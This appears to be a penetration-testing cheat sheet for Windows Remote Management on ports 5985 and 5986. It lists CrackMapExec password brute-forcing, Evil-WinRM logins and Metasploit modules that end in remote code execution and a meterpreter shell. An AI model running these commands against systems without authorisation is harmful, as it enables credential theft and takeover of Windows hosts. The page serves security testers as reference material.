---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
---

# 5985,5986 - WinRM

## CrackMapExec

```bash
# Bruteforce WinRM creds
crackmapexec winrm $IP -u Administrator -p /wordlists/passwords.txt

# Execute command with AUTHENTICATION
crackmapexec winrm $IP -u Administrator -p password123 -x "whoami"
```

## Evil-WinRM

```bash
# Login with AUTHENTICATION
evil-winrm -i $IP -u Administrator -p password123

# Login with CERTIFICATES / SSL
evil-winrm -S -c pub.key -k decrypted_priv.key -i $IP
```

## MSFconsole

```bash
auxiliary/scanner/winrm/winrm_auth_methods     # Checking AUTHENTICATION methods
auxiliary/scanner/winrm/winrm_cmd        # Running cmd with AUTHENTICATION
auxiliary/scanner/winrm/winrm_login      # brute-force

# RCE (get the shell/meterpreter) AUTHENTICATION
# if you can't run it [BUG]; make sure to (set FORCE_VBS true)
exploit/windows/winrm/winrm_script_exec
```
